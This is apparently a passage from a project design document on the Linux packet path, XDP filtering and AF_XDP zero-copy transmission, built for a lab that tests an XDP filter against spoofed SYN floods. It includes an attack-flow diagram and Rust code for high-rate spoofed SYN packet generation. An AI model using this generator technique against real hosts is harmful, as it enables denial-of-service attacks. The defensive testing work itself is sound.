│                         │ Yes: DMA to ring          IRQ or polling       │
│                         │ No: Drop                                        │
│                                                                            │
└────────────────────────────────────────────────────────────────────────────┘
                                     │
                                     │ Interrupt (or NAPI poll)
                                     ▼
┌────────────────────────────────────────────────────────────────────────────┐
│                                 KERNEL                                     │
│                                                                            │
│  ┌──────────────────────────────────────────────────────────────────────┐ │
│  │ 1. INTERRUPT HANDLER / NAPI POLL                                     │ │
│  │    - Acknowledge interrupt                                           │ │
│  │    - Schedule NAPI softirq for processing                           │ │
│  └──────────────────────────────────────────────────────────────────────┘ │
│                               │                                            │
│                               ▼                                            │
│  ┌──────────────────────────────────────────────────────────────────────┐ │
│  │ 2. NAPI POLL (softirq context)                                       │ │
│  │    - Process up to budget (default 64) packets per poll             │ │
│  │    - For each RX descriptor:                                        │ │
│  └──────────────────────────────────────────────────────────────────────┘ │
│                               │                                            │
│                               ▼                                            │
│  ┌──────────────────────────────────────────────────────────────────────┐ │
│  │ 3. XDP HOOK (if program attached) ◀─────── EARLIEST DROP POINT      │ │
│  │                                                                      │ │
│  │    xdp_frame = { data, data_end, data_meta }                        │ │
│  │                                                                      │ │
│  │    switch (bpf_prog_run_xdp(prog, &xdp_frame)) {                    │ │
│  │        XDP_DROP:   goto free_frame;    // Never allocate skb!       │ │
│  │        XDP_TX:     retransmit on same interface                     │ │
│  │        XDP_REDIRECT: send to different interface or AF_XDP          │ │
│  │        XDP_PASS:   continue to stack                                │ │
│  │    }                                                                 │ │
│  │                                                                      │ │
│  └──────────────────────────────────────────────────────────────────────┘ │
│                               │                                            │
│                               │ XDP_PASS                                   │
│                               ▼                                            │
│  ┌──────────────────────────────────────────────────────────────────────┐ │
│  │ 4. SKB ALLOCATION                                                    │ │
│  │    - Allocate sk_buff from slab                                     │ │
│  │    - Copy or reference packet data                                  │ │
│  │    - Set skb->protocol, skb->dev, etc.                              │ │
│  └──────────────────────────────────────────────────────────────────────┘ │
│                               │                                            │
│                               ▼                                            │
│  ┌──────────────────────────────────────────────────────────────────────┐ │
│  │ 5. NETFILTER / TC-BPF                                                │ │
│  │    - Traffic control hooks                                          │ │
│  │    - iptables PREROUTING                                            │ │
│  └──────────────────────────────────────────────────────────────────────┘ │
│                               │                                            │
│                               ▼                                            │
│  ┌──────────────────────────────────────────────────────────────────────┐ │
│  │ 6. IP LAYER (net/ipv4/ip_input.c)                                    │ │
│  │    - Validate IP header                                             │ │
│  │    - Check destination                                              │ │
│  │    - Routing decision                                               │ │
│  └──────────────────────────────────────────────────────────────────────┘ │
│                               │                                            │
│                               ▼                                            │
│  ┌──────────────────────────────────────────────────────────────────────┐ │
│  │ 7. TCP LAYER (net/ipv4/tcp_ipv4.c)                                   │ │
│  │    - Find socket                                                    │ │
│  │    - Validate sequence numbers                                      │ │
│  │    - ACK processing                                                 │ │
│  │    - Queue to socket receive buffer                                 │ │
│  └──────────────────────────────────────────────────────────────────────┘ │
│                               │                                            │
│                               ▼                                            │
│  ┌──────────────────────────────────────────────────────────────────────┐ │
│  │ 8. SOCKET LAYER                                                      │ │
│  │    - Wake up waiting process                                        │ │
│  │    - User calls recv() to get data                                  │ │
│  └──────────────────────────────────────────────────────────────────────┘ │
│                                                                            │
└────────────────────────────────────────────────────────────────────────────┘
```

### Why XDP Drops Are So Efficient

Let's compare the work done for a dropped packet:

**With iptables (netfilter):**
1. NIC DMAs packet to ring buffer
2. Interrupt/NAPI scheduled
3. **skb allocated** (memory allocation!)
4. Data copied to skb
5. Netfilter hooks traverse chains
6. Packet dropped
7. **skb freed** (memory deallocation!)

**With XDP:**
1. NIC DMAs packet to ring buffer
2. Interrupt/NAPI scheduled
3. XDP program runs on raw buffer
4. Returns XDP_DROP
5. Done - buffer recycled

No skb allocation, no copying, no netfilter traversal. This is why XDP can drop packets at **line rate** (millions of pps) while iptables struggles at a fraction of that.

### XDP Performance Numbers

Typical throughput for a single CPU core dropping packets:

| Method | Packets/sec | Notes |
|--------|-------------|-------|
| iptables DROP | ~1-2M pps | Full stack traversal |
| tc-bpf DROP | ~3-4M pps | Before some stack processing |
| XDP_DROP (generic) | ~5-6M pps | SKB mode |
| XDP_DROP (native) | ~10-20M pps | Driver mode |
| XDP_DROP (offload) | ~100M+ pps | NIC hardware! |

---

## Memory Allocation Deep Dive

### The sk_buff Slab Allocator

Linux uses slab allocation for frequent allocations like skbs:

```
SLAB CACHE: "skbuff_head_cache"

┌─────────────────────────────────────────────────────────────────┐
│                         SLAB PAGE                               │
├────────┬────────┬────────┬────────┬────────┬────────┬──────────┤
│  skb   │  skb   │  skb   │  skb   │ (free) │ (free) │ (free)   │
│  #1    │  #2    │  #3    │  #4    │        │        │          │
│  used  │  used  │  used  │  used  │  avail │  avail │  avail   │
├────────┴────────┴────────┴────────┴────────┴────────┴──────────┤
│                                                                 │
│  Each skb is 256 bytes (varies by kernel config)               │
│  Pre-allocated, cache-hot, NUMA-aware                          │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘

Allocation: O(1) - just pop from freelist
Deallocation: O(1) - just push to freelist

But still costs ~100-300 cycles per alloc/free!
```

### Page Pool (Modern Optimization)

Modern drivers use page pools to avoid per-packet allocation:

```c
// Driver pre-allocates a pool of pages for RX
struct page_pool *pool = page_pool_create(&params);

// NAPI poll - get pre-allocated page, not new allocation
page = page_pool_dev_alloc_pages(pool);

// Build skb referencing the page (no copy!)
skb = build_skb(page_address(page), ...);

// After processing, page returns to pool (not freed!)
page_pool_put_page(pool, page);
```

This is why our AF_PACKET TX still allocates but XDP RX with page pools is faster.

---

## The NAPI Subsystem

NAPI (New API) is Linux's interrupt mitigation system:

```
TRADITIONAL INTERRUPT-PER-PACKET:
  
  pkt1 → IRQ → process → return
  pkt2 → IRQ → process → return  
  pkt3 → IRQ → process → return    // High interrupt rate!
  ...

NAPI (Interrupt Coalescing + Polling):

  pkt1 → IRQ → schedule softirq
  pkt2 ─────┐
  pkt3 ─────┤  (packets queue up while polling)
  pkt4 ─────┤
            ▼
       softirq runs:
         process pkt1
         process pkt2
         process pkt3
         process pkt4
         check: more packets? yes → continue polling
                no → re-enable interrupts
```

**Why this matters for us:**

1. Our SYN flood creates many small packets
2. At high PPS, the target is constantly in NAPI poll mode
3. If XDP drops early, it can process more packets per poll cycle
4. Without XDP, each packet traverses the full stack, exhausting CPU

---

## Putting It All Together: Our Attack Flow

```
GENERATOR (userspace)                                TARGET (container)
───────────────────                                 ─────────────────────

1. Craft Ethernet frame
   ├─ dst MAC: aa:ee:10:e4:73:cc  ─────────────────▶ Container's MAC
   ├─ src MAC: c2:2e:3a:db:dd:fa  
   ├─ EtherType: 0x0800 (IPv4)
   └─ IP src: 10.x.x.x (spoofed!)
      IP dst: 192.168.1.200

2. sendto(AF_PACKET, ...)
   │
   ├─ [syscall boundary]
   │
   ├─ Allocate skb
   ├─ Copy frame to skb->data
   ├─ skb->dev = macv1
   │
   ├─ dev_queue_xmit(skb)
   │  └─ qdisc: pass through
   │
   ├─ macvlan driver
   │  └─ "dst MAC is another macvlan!"
   │  └─ Internal forward (no physical TX)          
   │                                          
   └──────────────────────────────────────────────▶ 3. Packet arrives in container
                                                      │
                                                      ├─ [macvlan RX]
                                                      │
                                                      ├─ NAPI poll
                                                      │
                                                      ├─ (no XDP - not attached)
                                                      │
                                                      ├─ Allocate skb
                                                      │
                                                      ├─ IP layer: dst is us!
                                                      │
                                                      ├─ TCP layer: SYN packet
                                                      │  ├─ No socket found
                                                      │  ├─ Create SYN_RECV
                                                      │  ├─ Send SYN-ACK
                                                      │  └─ (ACK never comes - 
                                                      │      source is spoofed!)
                                                      │
                                                      └─ SYN queue fills up → DoS!
```

**The Fix with XDP:**

```
                                                   3. Packet arrives in container
                                                      │
                                                      ├─ [macvlan RX]
                                                      │
                                                      ├─ NAPI poll
                                                      │
                                                      ├─ XDP PROGRAM ◀─────────
                                                      │  │                    │
                                                      │  │ src IP in 10/8?    │
                                                      │  │ YES → XDP_DROP     │ Packet
                                                      │  │                    │ never
                                                      │  └────────────────────┘ reaches
                                                      │                         TCP!
                                                      X  (nothing else happens)
```

---

## AF_XDP: Zero-Copy Packet Generation

This is what we've implemented in `xdp-generator/src/af_xdp.rs`. Instead of one syscall per packet, we use shared memory rings to batch operations.

### The Problem with AF_PACKET

```
                        AF_PACKET (current)
                        
      USERSPACE                           KERNEL
    ┌────────────┐                    ┌────────────┐
    │            │   sendto(pkt1)     │            │
    │  craft     │──────────────────▶│  alloc skb │
    │  packet 1  │   [syscall #1]    │  copy data │
    │            │                    │  enqueue   │
    │            │   sendto(pkt2)     │            │
    │  craft     │──────────────────▶│  alloc skb │
    │  packet 2  │   [syscall #2]    │  copy data │
    │            │                    │  enqueue   │
    │     ...    │       ...          │    ...     │
    │            │   sendto(pktN)     │            │
    │  craft     │──────────────────▶│  alloc skb │
    │  packet N  │   [syscall #N]    │  copy data │
    └────────────┘                    │  enqueue   │
                                      └────────────┘
    
    Cost: N syscalls, N memory copies, N skb allocations
    Practical limit: ~10k-50k pps per core
```

### AF_XDP Architecture

```
                        AF_XDP (zero-copy)
                        
      USERSPACE                           KERNEL
    ┌────────────────────────────────────────────────────────────┐
    │                                                            │
    │           UMEM (shared mmap'd memory region)               │
    │  ┌────────┬────────┬────────┬────────┬────────┬──────────┐ │
    │  │frame 0 │frame 1 │frame 2 │frame 3 │frame 4 │   ...    │ │
    │  │ pkt    │ pkt    │ pkt    │ (free) │ (free) │          │ │
    │  └────────┴────────┴────────┴────────┴────────┴──────────┘ │
    │      ▲        ▲        ▲                                   │
    │      │        │        │     (no copy - same memory!)      │
    │      ▼        ▼        ▼                                   │
    │  ┌─────────────────────────────────────────────────────┐   │
    │  │                    TX RING                          │   │
    │  │  ┌──────────┬──────────┬──────────┬────────────┐   │   │
    │  │  │ desc 0   │ desc 1   │ desc 2   │   ...      │   │   │
    │  │  │addr:0    │addr:2048 │addr:4096 │            │   │   │
    │  │  │len:54    │len:54    │len:54    │            │   │   │
    │  │  └──────────┴──────────┴──────────┴────────────┘   │   │
    │  │                                                     │   │
    │  │   producer ──────────────────────────▶ consumer    │   │
    │  │  (userspace)                           (kernel)    │   │
    │  │                                                     │   │
    │  │   Just update pointer - NO SYSCALL PER PACKET!     │   │
    │  └─────────────────────────────────────────────────────┘   │
    │                                                            │
    └────────────────────────────────────────────────────────────┘
                          │
                          │  sendto(0 bytes) - "kick" syscall
                          │  One syscall for MANY packets!
                          ▼
    ┌────────────────────────────────────────────────────────────┐
    │                        KERNEL                              │
    │                                                            │
    │   Reads TX ring, DMAs directly from UMEM to NIC           │
    │   No skb allocation, no memory copy!                      │
    │                                                            │
    └────────────────────────────────────────────────────────────┘
```

### The Four Rings

AF_XDP uses four ring buffers for bidirectional zero-copy:

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                         AF_XDP RING ARCHITECTURE                            │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│   ┌─────────────────────────────────────────────────────────────────────┐  │
│   │                            UMEM                                     │  │
│   │      (Shared memory pool of fixed-size frames)                     │  │
│   │                                                                     │  │
│   │   ┌────────┬────────┬────────┬────────┬────────┬────────┬────────┐ │  │
│   │   │frame 0 │frame 1 │frame 2 │frame 3 │frame 4 │frame 5 │  ...   │ │  │
│   │   │ 2048B  │ 2048B  │ 2048B  │ 2048B  │ 2048B  │ 2048B  │        │ │  │
│   │   └────────┴────────┴────────┴────────┴────────┴────────┴────────┘ │  │
│   │       ▲                 │                 ▲                 │      │  │
│   │       │                 │                 │                 │      │  │
│   │       │    ┌────────────┘                 │    ┌────────────┘      │  │
│   │       │    │                              │    │                   │  │
│   └───────┼────┼──────────────────────────────┼────┼───────────────────┘  │
│           │    │                              │    │                      │
│           │    ▼                              │    ▼                      │
│   ┌───────┴────────────┐              ┌───────┴────────────┐              │
│   │    FILL RING       │              │    TX RING         │              │
│   │                    │              │                    │              │
│   │ User → Kernel      │              │ User → Kernel      │              │
│   │ "Here are empty    │              │ "Please transmit   │              │
│   │  frames for RX"    │              │  these frames"     │              │
│   │                    │              │                    │              │
│   │ [addr0|addr1|...]  │              │ [desc0|desc1|...]  │              │
│   │                    │              │                    │              │
│   │ prod→         ←cons│              │ prod→         ←cons│              │
│   │ (user)      (kernel)│              │ (user)      (kernel)│              │
│   └────────────────────┘              └────────────────────┘              │
│           │                                   │                           │
│           │                                   │                           │
│           ▼                                   ▼                           │
│   ┌────────────────────┐              ┌────────────────────┐              │
│   │    RX RING         │              │  COMPLETION RING   │              │
│   │                    │              │                    │              │
│   │ Kernel → User      │              │ Kernel → User      │              │
│   │ "These frames have │              │ "These TX frames   │              │
│   │  received packets" │              │  are now done"     │              │
│   │                    │              │                    │              │
│   │ [desc0|desc1|...]  │              │ [addr0|addr1|...]  │              │
│   │                    │              │                    │              │
│   │ prod→         ←cons│              │ prod→         ←cons│              │
│   │ (kernel)    (user) │              │ (kernel)    (user) │              │
│   └────────────────────┘              └────────────────────┘              │
│                                                                           │
└─────────────────────────────────────────────────────────────────────────────┘

For TX-only (our use case):
1. Write packet to UMEM frame
2. Submit frame address to TX ring (update producer pointer)
3. Optionally kick kernel (one sendto() for batch)
4. Read completion ring to reclaim transmitted frames
5. Reuse frame for next packet
```

### Ring Structure in Memory

Each ring is a simple producer-consumer queue in shared memory:

```c
// Ring layout in mmap'd memory
struct xdp_ring {
    uint32_t producer;  // Written by producer, read by consumer
    uint32_t consumer;  // Written by consumer, read by producer
    uint32_t flags;     // XDP_RING_NEED_WAKEUP flag
    uint32_t pad;
    
    // Array of descriptors follows
    union {
        struct xdp_desc descs[N];  // For TX/RX rings
        uint64_t        addrs[N];  // For Fill/Completion rings
    };
};

// TX/RX descriptor
struct xdp_desc {
    uint64_t addr;    // Offset into UMEM where frame data lives
    uint32_t len;     // Packet length
    uint32_t options; // Reserved
};
```

### The TX Hot Path (Our Implementation)

```rust
// xdp-generator/src/af_xdp.rs

/// Send a batch of SYN packets (the hot path)
pub fn send_syn_batch(&mut self, target_ip: Ipv4Addr, ..., count: usize) -> usize {
    let mut submitted = 0;
    let mut batch = Vec::with_capacity(64);

    for _ in 0..count {
        // 1. Get a free frame from UMEM (no syscall, just pop from list)
        let (addr, frame) = self.socket.get_frame()?;

        // 2. Write packet directly to UMEM (zero-copy!)
        //    The frame slice points directly into mmap'd UMEM
        let len = write_syn_packet(frame, src_mac, dst_mac, ...);

        // 3. Add to batch
        batch.push((addr, len));

        // 4. Submit batch when full
        if batch.len() >= 64 {
            submitted += self.socket.submit_frames(&batch);  // Just updates ring pointer!
            batch.clear();
        }
    }

    // 5. Submit remaining
    submitted += self.socket.submit_frames(&batch);
    
    submitted  // Hundreds of packets, ZERO syscalls so far!
}

/// Submit frames to TX ring (no syscall!)
pub fn submit_frames(&mut self, frames: &[(u64, u32)]) -> usize {
    // Get current producer position
    let prod = (*self.producer).load(Ordering::Relaxed);
    
    // Write descriptors to ring
    for (i, (addr, len)) in frames.iter().enumerate() {
        let slot = (prod + i) & self.mask;
        self.ring[slot] = XdpDesc { addr: *addr, len: *len, options: 0 };
    }
    
    // Memory barrier + update producer (makes visible to kernel)
    fence(Ordering::Release);
    (*self.producer).store(prod + count, Ordering::Release);
    
    count  // Still no syscall!
}

/// Kick kernel to transmit (one syscall for all submitted packets)
pub fn kick(&self) -> Result<()> {
    sendto(self.fd, null, 0, MSG_DONTWAIT, null, 0)
    // This single syscall tells kernel: "drain the TX ring"
}
```

### Performance Comparison

| Method | Syscalls for 10k packets | Memory Copies | Theoretical PPS |
|--------|--------------------------|---------------|-----------------|
| AF_PACKET (sendto loop) | 10,000 | 10,000 | ~10-50k |
| AF_PACKET (sendmmsg) | ~100 | 10,000 | ~50-100k |
| AF_XDP (copy mode) | 1-10 | 0 (writes to UMEM) | ~1M |
| AF_XDP (zero-copy) | 1-10 | 0 | ~10M+ |
| AF_XDP (busy poll) | 0 | 0 | ~20M+ |

### Setting Up AF_XDP

```rust
// 1. Create XDP socket
let fd = socket(AF_XDP, SOCK_RAW, 0);

// 2. Allocate UMEM (shared memory for frames)
let umem = mmap(NULL, num_frames * frame_size, 
                PROT_READ | PROT_WRITE,
                MAP_PRIVATE | MAP_ANONYMOUS | MAP_HUGETLB, -1, 0);

// 3. Register UMEM with socket
let reg = xdp_umem_reg {
    addr: umem as u64,
    len: umem_size,
    chunk_size: 2048,
    headroom: 0,
};
setsockopt(fd, SOL_XDP, XDP_UMEM_REG, &reg, sizeof(reg));

// 4. Create TX and Completion rings
setsockopt(fd, SOL_XDP, XDP_TX_RING, &ring_size, 4);
setsockopt(fd, SOL_XDP, XDP_UMEM_COMPLETION_RING, &ring_size, 4);

// 5. Get ring mmap offsets
let mut offsets = xdp_mmap_offsets::default();
getsockopt(fd, SOL_XDP, XDP_MMAP_OFFSETS, &offsets, &mut len);

// 6. Mmap the rings
let tx_ring = mmap(NULL, tx_ring_size, ..., fd, XDP_PGOFF_TX_RING);
let comp_ring = mmap(NULL, comp_ring_size, ..., fd, XDP_UMEM_PGOFF_COMPLETION_RING);

// 7. Bind to interface
let sxdp = sockaddr_xdp {
    family: AF_XDP,
    flags: XDP_COPY | XDP_USE_NEED_WAKEUP,
    ifindex: if_nametoindex("macv1"),
    queue_id: 0,
};
bind(fd, &sxdp, sizeof(sxdp));
```

### NEED_WAKEUP Optimization

With `XDP_USE_NEED_WAKEUP`, the kernel sets a flag when it's sleeping and needs a kick:

```rust
// Without NEED_WAKEUP: must call sendto() every batch
loop {
    submit_frames(&batch);
    sendto(fd, NULL, 0, ...);  // Every time!
}

// With NEED_WAKEUP: only kick when kernel is sleeping
loop {
    submit_frames(&batch);
    
    if ring.flags.load() & XDP_RING_NEED_WAKEUP {
        sendto(fd, NULL, 0, ...);  // Only when needed
    }
    // Otherwise kernel is already polling, no syscall needed!
}
```

This can reduce syscalls from thousands to just a few per second.

### Requirements for AF_XDP

1. **Kernel 4.18+** (5.x recommended for full features)
2. **CAP_NET_RAW or root** for socket creation
3. **Either:**
   - An XDP program attached to the interface (for zero-copy native mode)
   - OR use `XDP_SKB_MODE` flag (works without XDP program, but slower)
4. **Driver support** for zero-copy mode (Intel i40e, ixgbe, mlx5, etc.)

For our macvlan interface, we'll use copy mode (`XDP_COPY`) which works everywhere but is still much faster than AF_PACKET.

---

## Current Status (Feb 2026)

### Completed

1. **XDP toolchain fixed** - Pinned aya-ebpf 0.1.0 + aya-ebpf-cty 0.2.1
2. **XDP filter working** - Classifies and drops 10.0.0.0/8 attack traffic
3. **Packet sampling** - Full 256-byte samples to userspace via perf buffer
4. **Pcap capture** - Real-time packet capture for analysis
5. **sendmmsg() batching** - 100x fewer syscalls, ~45k pps

### Limitations

- **AF_XDP blocked on macvlan** - Need physical NIC for zero-copy
- **SKB mode only** - Macvlan doesn't support native XDP driver mode
- **256-byte samples** - BPF 512-byte stack limit

### Next Steps

1. **VSA/HDC integration** - Replace IP-based classification with learned embeddings
2. **Second NIC** - Enable AF_XDP zero-copy for 10x+ throughput
3. **Burst scheduling** - Random attack patterns (30s-300s bursts)
4. **Ring buffer** - Use BPF ring buffer instead of perf buffer (newer API)
